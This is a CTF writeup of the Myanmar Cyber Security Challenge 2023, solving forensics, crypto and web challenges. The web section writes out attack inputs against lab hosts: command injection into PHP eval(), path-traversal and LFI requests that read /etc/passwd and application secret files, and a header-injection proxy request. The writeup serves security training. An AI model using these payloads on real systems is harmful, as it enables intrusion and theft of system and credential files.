---
title: Myanmar Cyber Security Challenge 2023 Writeup
published: 2023-07-15
description: Our solutions for Myanmar Cyber Security Challenge 2023 — forensics, web, pwn, RE and crypto. Translated from our original Burmese writeup.
tags: [ctf, forensics, web, crypto, pwn, reverse]
category: CTF
draft: false
---

Solved by **Team UI$**. Originally written in Burmese — translated to English here.

## Round 1 — Forensics / Pwn / RE

### Wireless Problem (Forensics)

We brute-forced the pcap file with the `rockyou` wordlist and got the flag.

![Wireless Problem](/images/mcsc-2023/mcsc-2023-p01-21.png)

### Account Compromise (Forensics)

We filtered for Event ID **4624** (successful remote logon). Normal logins come
from the System Account, and besides `Malwarelab` the only other username we
found was `ihateyou` — that was the flag.

![Event log filtering](/images/mcsc-2023/mcsc-2023-p02-24.png)

### Logs Investigation (Forensics)

We filtered failed password attempts in the auth logs:

```console
$ grep "sshd" auth.log | grep "Failed password"
```

Filtering out the invalid accounts, we noticed a successful login as `alice` —
that was the flag.

![auth.log analysis](/images/mcsc-2023/mcsc-2023-p03-27.png)

### Lost the key (forensics)

The password policy was `Alphabet + "5" + Alphabet + Number + "1" + Alphabet + "@" + "s" + Number`,
so we generated the wordlist with Python:

```python
# Password Policy: Alphabet + "5" + Alphabet + Number + "1" + Alphabet + "@" + "s" + Number
import string

for first_char in string.ascii_letters:
    for third_char in string.ascii_letters:
        for fourth_char in string.digits:
            for sixth_char in string.ascii_letters:
                for nineth_char in string.digits:
                    password = first_char + "5" + third_char + str(fourth_char) + "1" \
                        + sixth_char + "@" + "s" + str(nineth_char)
                    print(password)
                    with open('wordlist.txt', 'a') as f:
                        f.write(password + '\n')
```

Brute-forcing with the generated wordlist cracked the password and gave us the flag.

![Cracked](/images/mcsc-2023/mcsc-2023-p04-30.png)

### Overflowme2 (Pwn)

Running `strings` on the binary and checking the output against the challenge
description revealed the flag.

![strings on the binary](/images/mcsc-2023/mcsc-2023-p04-31.png)

### GoGoGo (RE)

`file` showed the challenge is a PE executable, and `peinfo` showed it is a
command-line file. Running it printed the output below.

![Program output](/images/mcsc-2023/mcsc-2023-p05-34.png)

Only one character is a real space — the rest are Unicode format characters.
The hint mentions the bit shift method, which pointed to a ROT-style algorithm.
Rotating the string back revealed the flag.

![Decoded](/images/mcsc-2023/mcsc-2023-p05-35.png)

## Round 2 — Web / Forensics

### Flag Calculator (30 Marks) — Web

![Flag Calculator](/images/mcsc-2023/mcsc-2023-p06-44.png)

This was a command injection vulnerability — the app uses PHP's
[`eval()`](https://www.php.net/manual/en/function.eval.php) function, which made
it possible:

```console
`ls`
`cat calculator.php`
```

Reading `calculator.php` with `cat` and checking the view-source gave the flag.

### Warmup LFI (40 Marks) — Web

![Warmup LFI](/images/mcsc-2023/mcsc-2023-p06-45.png)

A Local File Inclusion vulnerability:

```console
$ curl --path-as-is "http://192.168.100.52:8000/../../../../flag.txt"
```

That request returned the flag.

### NCSC Proxy (70 Marks) — Web

![NCSC Proxy](/images/mcsc-2023/mcsc-2023-p07-50.png)

```console
$ curl -H "X-Forwarded-Host: 127.0.0.1\@ncsc.gov.mm/../flag" http://192.168.100.52:8086
```

Sending that request returned the flag.

### KyawGyi's Bottle (90 Marks) — Web

![KyawGyi's Bottle](/images/mcsc-2023/mcsc-2023-p08-61.png)

The challenge site showed a poem. We found an LFI on the `id` parameter:

```text
http://192.168.100.52:8080/show?id=spring.txt
http://192.168.100.52:8080/show?id=/etc/passwd
```

![LFI to /etc/passwd](/images/mcsc-2023/mcsc-2023-p08-62.png)

Then we read the source through `/proc/self/cwd`:

```text
http://192.168.100.52:8080/show?id=/proc/self/cwd/app.py
```

![app.py](/images/mcsc-2023/mcsc-2023-p09-66.png)

```text
http://192.168.100.52:8080/show?id=/proc/self/cwd/config/secret.py
```

![secret.py](/images/mcsc-2023/mcsc-2023-p09-67.png)

The app uses the `pickle` package, which is vulnerable and allows RCE on
deserialization. Here is the exploit code:

![Exploit](/images/mcsc-2023/mcsc-2023-p10-70.png)

![Exploit output](/images/mcsc-2023/mcsc-2023-p10-71.png)

Decoding the resulting base64 gives the flag.

### Who is Poc (15 Marks) — Forensics

![Who is Poc](/images/mcsc-2023/mcsc-2023-p10-72.png)

We needed to find the **Registrant Name**. First with `whois`:

```console
$ whois travel-myanmar.net
```

![whois output](/images/mcsc-2023/mcsc-2023-p11-75.png)

Then we searched the Registry Domain ID on Google, which revealed the
Registrant Name — and that was the flag.

![Google search](/images/mcsc-2023/mcsc-2023-p11-76.png)

### Log Investigation (20 Marks) — Forensics

![Log Investigation](/images/mcsc-2023/mcsc-2023-p12-81.png)

The challenge was to find a username other than `root` and `ubuntu` in
`auth.log`. We opened the file in a text editor, searched for `user=a`, and
found the username — which was the flag.

![Found username](/images/mcsc-2023/mcsc-2023-p12-82.png)

## Round 3 — Crypto

### Easy_Cipher (20) — Crypto

![Easy_Cipher](/images/mcsc-2023/mcsc-2023-p13-85.png)

The ciphertext decodes (ROT13/substitution on
[cryptii.com](https://cryptii.com/)) to:

> A simple letter substitution cipher that replaces a letter with the letter
> xiii letters after it in the alphabet. ROT xiii is an example of the caesar
> cipher, developed in ancient Rome. The flag is easy_rotxiiicipher.

Flag: `MCSC2023{easy_rotxiiicipher}`

### Morse (20) — Crypto

![Morse](/images/mcsc-2023/mcsc-2023-p14-88.png)

Decoding the Morse code gives hex bytes:

```text
46 4C 41 47 3D 57 45 4C 43 4F 4D 45 5F 54 4F 5F 34 33 20 35 34 20 34 36
```

Hex-decoding that gives `FLAG=WELCOME_TO_CTF`.

Flag: `MCSC2023{WELCOME_TO_CTF}`

### Myanmar Song (20) — Crypto

![Myanmar Song](/images/mcsc-2023/mcsc-2023-p15-92.png)

`Myanmar_National_Songs.exe` is actually a data file (`file` command), so we
ran `strings` on it and found a base16-encoded block at the bottom.

![strings output](/images/mcsc-2023/mcsc-2023-p15-93.png)

![Hex block](/images/mcsc-2023/mcsc-2023-p15-94.png)

Hex-decoding it: `MCSC2023{GoldenMyanmar}`

### Woman Mind (50) — Crypto

![Woman Mind](/images/mcsc-2023/mcsc-2023-p16-97.png)

Reversing the given byte string:

```text
d7 93 73 02 43 73 02 23 73 02 13 63 02 03 53 02 66 53 02 66 63 02 43 53 02 66 53
02 66 63 02 73 43 02 66 53 02 43 73 02 53 63 02 36 43 b7 33 23 03 23 34 35 34 d4
```

gives:

```text
4d 43 53 43 32 30 32 33 7b 34 63 20 36 35 20 37 34 20 35 66 20 34 37 20 36 66 20
35 66 20 35 34 20 36 66 20 35 66 20 35 30 20 36 31 20 37 32 20 37 34 20 37 39 7d
```

Hex-decoding: `MCSC2023{Let_Go_To_Party}`

### Eiffel Tower (50) — Crypto

![Eiffel Tower](/images/mcsc-2023/mcsc-2023-p17-100.png)

`Gfilxq Nme Niw Nrbcaqqma. Rpgf ABD Nlaurp qq Tmtbrl tyab Uwnluye imcc Ewgae
Vckr Ysrqbgbl. Ombb tspi.` decoded with the Vigenère cipher gives:

> Thanks For Pay Attension. This CTF Answer is Golden land Myanmar keep Going
> Next Question. Good luck.

Flag: `MCSC2023{Golden land Myanmar}`

### National Stego flag (50) — Crypto

![National Stego flag](/images/mcsc-2023/mcsc-2023-p18-103.png)

The file is `national_flag.wav`. We extracted the hidden data with wavsteg:

```console
$ stegolsb wavsteg -r -i national_flag.wav -o output.txt -n 2 -b 55555
```

Grepping `output.txt` reveals the flag.

![Flag found](/images/mcsc-2023/mcsc-2023-p18-104.png)

Flag: `MCSC2023{N4t10n4l_S0ng_1n_St3g0}`

### 3 steps Hair (50) — Crypto

![3 steps Hair](/images/mcsc-2023/mcsc-2023-p19-108.png)

Three decoding steps:

1. Binary → text:

```text
GRSCANBTEA2TGIBUGMQDGMRAGMYCAMZSEAZTGIBXMIQDIYZAGY2SANZUEA2WMI
BUG4QDMZRAGVTCANJUEA3GMIBVMYQDIZBAGYYSANZSEA3DCIBXGYQDMOJAGZQ
SANRREA3TSIBWGEQDOZA=
```

2. Base32 decode:

```text
4d 43 53 43 32 30 32 33 7b 4c 65 74 5f 47 6f 5f 54 6f 5f 4d 61 72 61 76 69 6a 61
79 61 7d
```

3. Hex decode → `MCSC2023{Let_Go_To_Maravijaya}`

### Crypto_3 (500) — Crypto

![Crypto_3](/images/mcsc-2023/mcsc-2023-p20-111.png)

We rewrote the given Python code in decrypt form and decrypted the encrypted
message with the key.

![Decryption script](/images/mcsc-2023/mcsc-2023-p21-114.png)

Flag: `MCSC2023{Bagan, From The Heart Of the Myanmar People}`

### Crypto_2 (50) — Crypto

![Crypto_2](/images/mcsc-2023/mcsc-2023-p21-115.png)

`66-2-999-7-999-444-3-2-9-0-222-2-7-444-8-2-555-000-666-333-0-6-999-2-66-6-2-777`
is old phone keypad (T9) typing. Typing it out gives
`NAYPYIDAW CAPITAL OF MYANMAR`.

Flag: `MCSC2023{NAYPYIDAW CAPITAL OF MYANMAR}`
